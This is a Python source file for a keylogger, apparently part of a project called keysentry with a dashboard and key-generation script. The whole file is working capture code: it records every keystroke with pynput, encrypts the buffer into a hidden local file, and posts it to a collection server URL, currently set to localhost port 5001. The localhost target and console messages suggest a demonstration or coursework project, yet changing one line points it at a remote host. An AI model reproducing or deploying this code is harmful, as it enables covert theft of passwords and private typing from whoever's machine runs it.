# keysentry/keylogger.py
# UPDATED: Handles termination signals properly to save data before exiting.

from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import base64
import os
import sys
import requests
import signal
import threading
import time

# ========== Setup ==========
key_path = "key.key"
log_file = ".keylog.txt"
# IMPORTANT: Ensure this matches your dashboard port (5001)
server_url = "http://127.0.0.1:5001/receive-log"

buffer = []
buffer_lock = threading.Lock()

# ========== Load Encryption Key ==========
if not os.path.exists(key_path):
    print("❌ Encryption key not found. Please run keygen.py first.")
    sys.exit(1)

with open(key_path, "rb") as key_file:
    key = key_file.read()

fernet = Fernet(key)

# ========== Flush Buffer ==========
def flush_buffer():
    """Encrypts buffer and sends it to the server/local file."""
    with buffer_lock:
        if not buffer:
            return
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        data = ''.join(buffer)
        buffer.clear()

    print(f"📦 Encrypting {len(data)} keystrokes...")
    log_entry = f"[{timestamp}] {data}"
    encrypted = fernet.encrypt(log_entry.encode())
    encoded = base64.b64encode(encrypted)

    # 1. Save locally
    with open(log_file, "ab") as file:
        file.write(encoded + b"\n")

    # 2. Send to server
    try:
        response = requests.post(server_url, data=encrypted, timeout=2)
        if response.status_code == 200:
            print("📤 Buffer sent to server successfully.")
        else:
            print(f"⚠️ Server returned error: {response.status_code}")
    except Exception as e:
        print(f"❌ Failed to send to server: {e}")

# ========== Handle Keystrokes ==========
def on_press(key):
    try:
        k = key.char
    except AttributeError:
        # Format special keys cleanly
        if key == keyboard.Key.space:
            k = " "
        elif key == keyboard.Key.enter:
            k = "[ENTER]\n"
        else:
            k = f"[{key.name}]"

    with buffer_lock:
        buffer.append(k)

# ========== Handle Exit Signals (SIGINT & SIGTERM) ==========
def handle_exit(signal_received, frame):
    print(f"\n🛑 Exiting (Signal {signal_received}). Flushing buffer...")
    flush_buffer()
    # Give the file operations a split second to finish
    time.sleep(0.5) 
    sys.exit(0)

# Catch Ctrl+C (2) and Termination (15)
signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)

# ========== Start Keylogger ==========
print(f"🟢 Keylogger started (Target: {server_url})")
print("   Press Ctrl+C in the launcher to stop and save logs.")

# Blocking listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()